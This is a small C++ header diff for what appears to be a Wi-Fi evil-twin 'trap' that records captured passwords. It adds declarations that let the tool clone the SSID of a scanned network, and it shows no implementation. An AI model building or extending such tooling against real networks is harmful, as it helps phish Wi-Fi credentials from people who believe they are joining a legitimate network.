@@ -25,6 +25,9 @@ public:
   unsigned long getLastPasswordShowUntil() const {
     return lastPasswordShowUntil_;
   }
+  /** Set SSID to clone from scan (index). If -1, use default. */
+  void setClonedSSID(int scanIndex);
+  const char *getClonedSSID() const { return clonedSSID_; }
 
 private:
   void setupHandlers();
@@ -35,6 +38,8 @@ private:
   int logsCaptured_ = 0;
   char lastPassword_[TRAP_LAST_PASSWORD_LEN];
   unsigned long lastPasswordShowUntil_ = 0;
+  char clonedSSID_[33];
+  bool useClonedSSID_ = false;
 };
 
 #endif
